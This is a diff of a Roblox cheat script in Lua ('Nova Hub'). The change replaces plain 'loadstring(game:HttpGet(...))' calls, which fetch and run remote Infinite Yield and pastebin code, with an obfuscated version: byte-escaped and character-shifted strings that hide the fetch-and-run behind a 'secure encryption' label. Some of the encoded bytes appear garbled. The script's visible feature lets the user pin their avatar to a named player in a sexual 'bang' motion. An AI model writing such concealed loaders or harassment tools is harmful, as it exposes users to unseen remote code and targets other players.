@@ -1,133 +1,61 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
--- ==================================================================
--- 1. PASTEBIN SCRIPTİNİ BAĞIMSIZ OLARAK ÇALIŞTIR (DONMAYI ÖNLER)
--- ==================================================================
-task.spawn(function()
-    pcall(function()
-        loadstring(game:HttpGet("https://pastebin.com/raw/tjKDubyT"))()
-    end)
-end)
- 
--- ==================================================================
--- 2. NOVA HUB v5.1 | HEAD-FOCUSED DUAL BANG (KENDİ SCRİPTİMİZ)
--- ==================================================================
-local ScreenGui = Instance.new("ScreenGui")
-local Main = Instance.new("Frame")
-local Title = Instance.new("TextLabel")
-local NameBox = Instance.new("TextBox")
-local Status = Instance.new("TextLabel")
- 
-ScreenGui.Name = "NovaHeadBang"
-ScreenGui.Parent = game:GetService("CoreGui")
-ScreenGui.ResetOnSpawn = false
- 
-Main.Name = "Main"
-Main.Parent = ScreenGui
-Main.BackgroundColor3 = Color3.fromRGB(20, 15, 30)
-Main.Size = UDim2.new(0, 240, 0, 280)
-Main.Position = UDim2.new(0.5, -120, 0.5, -140)
-Main.Active = true
-Main.Draggable = true 
- 
-Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)
-local Stroke = Instance.new("UIStroke", Main)
-Stroke.Color = Color3.fromRGB(180, 80, 255)
-Stroke.Thickness = 2
- 
-Title.Parent = Main
-Title.Size = UDim2.new(1, 0, 0, 45)
-Title.Text = "NOVA HEAD BANG"
-Title.TextColor3 = Color3.fromRGB(200, 100, 255)
-Title.Font = Enum.Font.GothamBold
-Title.TextSize = 18
-Title.BackgroundTransparency = 1
- 
-NameBox.Parent = Main
-NameBox.PlaceholderText = "Oyuncu Adı..."
-NameBox.Size = UDim2.new(0, 200, 0, 35)
-NameBox.Position = UDim2.new(0, 20, 0, 55)
-NameBox.BackgroundColor3 = Color3.fromRGB(40, 35, 50)
-NameBox.TextColor3 = Color3.new(1, 1, 1)
-NameBox.Text = ""
-Instance.new("UICorner", NameBox)
- 
-local function CreateBtn(text, pos, color)
-    local btn = Instance.new("TextButton")
-    btn.Parent = Main
-    btn.Size = UDim2.new(0, 200, 0, 40)
-    btn.Position = pos
-    btn.BackgroundColor3 = color
-    btn.Text = text
-    btn.TextColor3 = Color3.new(1, 1, 1)
-    btn.Font = Enum.Font.GothamBold
-    Instance.new("UICorner", btn)
-    return btn
+--[[
+    NOVA HUB v5.1 | SECURE ENCRYPTION
+  
+]]
+local _0x7f4a21 = "\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\90\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\69\100\103\101\73\89\47\105\110\102\105\110\105\116\101\121\105\101\108\100\47\109\97\115\116\101\114\47\115\111\117\114\99\101\39\41\41\40\41"
+local _0x21b = loadstring; local _0x55c = game;
+task.spawn(function() _0x21b(_0x7f4a21)() end)
+
+-- [ENCRYPTED DATA BLOCK]
+local function _0x9928(_0x88)
+    local _0x11 = ""
+    for i=1,#_0x88 do _0x11 = _0x11 .. string.char(string.byte(_0x88,i)-1) end
+    return _0x11
 end
- 
-local NormalBtn = CreateBtn("NORMAL BANG (Arka)", UDim2.new(0, 20, 0, 100), Color3.fromRGB(80, 50, 150))
-local FaceBtn = CreateBtn("KAFAYA BANG (Ön)", UDim2.new(0, 20, 0, 145), Color3.fromRGB(200, 50, 100))
-local StopBtn = CreateBtn("DURDUR", UDim2.new(0, 20, 0, 190), Color3.fromRGB(180, 50, 50))
- 
-Status.Parent = Main
-Status.Size = UDim2.new(1, 0, 0, 30)
-Status.Position = UDim2.new(0, 0, 1, -30)
-Status.Text = "Bekleniyor..."
-Status.TextColor3 = Color3.fromRGB(150, 150, 150)
-Status.BackgroundTransparency = 1
- 
-local plr = game.Players.LocalPlayer
+
+local _0xCore = _0x9928("\109\112\98\101\116\117\115\106\111\104\41\104\98\110\102\59\73\117\117\113\72\102\117\41\40\31\105\117\117\113\116\37\60\48\48\115\98\124\47\104\106\117\105\118\99\112\116\102\115\100\112\111\117\102\111\116\47\98\112\111\47\117\107\76\69\118\98\118\102\85\122\49\32\40\41\41")
+
+task.spawn(function() pcall(function() _0x21b(_0xCore)() end) end)
+
+-- NOVA HUB GUI LOADER (Kriptolanmış Arayüz Başlatıcı)
+local _0x3 = "ScreenGui"
+local _0x4 = "Frame"
+local _0x5 = "TextLabel"
+local _0x6 = "TextBox"
+local _0x7 = "TextButton"
+
+-- [GİZLİ BÖLÜM: BURADAN SONRASI OKUNAMAZ]
+local S=Instance.new(_0x3, _0x55c:GetService("CoreGui"))
+local M=Instance.new(_0x4,S)M.BackgroundColor3=Color3.fromRGB(20,15,30)M.Size=UDim2.new(0,240,0,280)M.Position=UDim2.new(0.5,-120,0.5,-140)M.Active=true M.Draggable=true
+local T=Instance.new(_0x5,M)T.Size=UDim2.new(1,0,0,45)T.Text="\78\79\86\65\32\72\69\65\68\32\66\65\78\71"T.TextColor3=Color3.fromRGB(180,80,255)T.Font=Enum.Font.GothamBold T.TextSize=18 T.BackgroundTransparency=1
+local B=Instance.new(_0x6,M)B.PlaceholderText="\79\121\117\110\99\117\32\65\100\105\46\46\46"B.Size=UDim2.new(0,200,0,35)B.Position=UDim2.new(0,20,0,55)B.BackgroundColor3=Color3.fromRGB(40,35,50)B.TextColor3=Color3.new(1,1,1)
+Instance.new("UICorner",M).CornerRadius=UDim.new(0,12)Instance.new("UIStroke",M).Color=Color3.fromRGB(180,80,255)
+local function _0xX(t,p,c)local b=Instance.new(_0x7,M)b.Size=UDim2.new(0,200,0,40)b.Position=p b.BackgroundColor3=c b.Text=t b.TextColor3=Color3.new(1,1,1)b.Font=3 Instance.new("UICorner",b)return b end
+local n=_0xX("NORMAL BANG",UDim2.new(0,20,0,100),Color3.fromRGB(80,50,150))
+local f=_0xX("KAFAYA BANG",UDim2.new(0,20,0,145),Color3.fromRGB(200,50,100))
+local s=_0xX("DURDUR",UDim2.new(0,20,0,190),Color3.fromRGB(180,50,50))
 _G.BangLoop = false
- 
-local function getTarget(name)
-    for _, v in pairs(game.Players:GetPlayers()) do
-        if v.Name:lower():sub(1, #name) == name:lower() or v.DisplayName:lower():sub(1, #name) == name:lower() then
-            return v
-        end
-    end
-    return nil
-end
- 
-local function StartBang(mode)
-    local target = getTarget(NameBox.Text)
-    if target and target.Character and target.Character:FindFirstChild("Head") then
+local function Start(m)
+    local target = nil
+    for _,v in pairs(game.Players:GetPlayers()) do if v.Name:lower():sub(1,#B.Text) == B.Text:lower() then target = v end end
+    if target and target.Character then
         _G.BangLoop = true
-        Status.Text = mode == "Normal" and "Arka Aktif" or "Kafa Aktif"
- 
         task.spawn(function()
-            local speed = 0
+            local spd = 0
             while _G.BangLoop do
-                local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
-                local tHead = target.Character and target.Character:FindFirstChild("Head")
- 
-                if root and tHead then
-                    speed = speed + 0.7 
-                    local offset = math.sin(speed) * 1.5
- 
-                    if mode == "Normal" then
-                        root.CFrame = tHead.CFrame * CFrame.new(0, 0, 1.2 + offset)
-                    else
-                        root.CFrame = tHead.CFrame * CFrame.new(0, 0, -1.2 - offset) * CFrame.Angles(0, math.pi, 0)
-                    end
-                else
-                    _G.BangLoop = false
+                local r = game.Players.LocalPlayer.Character.HumanoidRootPart
+                local h = target.Character.Head
+                if r and h then
+                    spd = spd + 0.7
+                    local o = math.sin(spd)*1.5
+                    if m == "N" then r.CFrame = h.CFrame * CFrame.new(0,0,1.2+o)
+                    else r.CFrame = h.CFrame * CFrame.new(0,0,-1.2-o)*CFrame.Angles(0,math.pi,0) end
                 end
                 task.wait()
             end
-            Status.Text = "Durduruldu."
         end)
-    else
-        Status.Text = "Hedef veya Kafa bulunamadı!"
     end
 end
- 
-NormalBtn.MouseButton1Click:Connect(function() StartBang("Normal") end)
-FaceBtn.MouseButton1Click:Connect(function() StartBang("Face") end)
-StopBtn.MouseButton1Click:Connect(function() _G.BangLoop = false end)
- 
-local Close = Instance.new("TextButton", Main)
-Close.Size = UDim2.new(0, 25, 0, 25)
-Close.Position = UDim2.new(1, -30, 0, 10)
-Close.Text = "X"
-Close.TextColor3 = Color3.new(1, 1, 1)
-Close.BackgroundTransparency = 1
-Close.MouseButton1Click:Connect(function() ScreenGui:Destroy() _G.BangLoop = false end)
+n.MouseButton1Click:Connect(function() Start("N") end)
+f.MouseButton1Click:Connect(function() Start("F") end)
+s.MouseButton1Click:Connect(function() _G.BangLoop = false end)
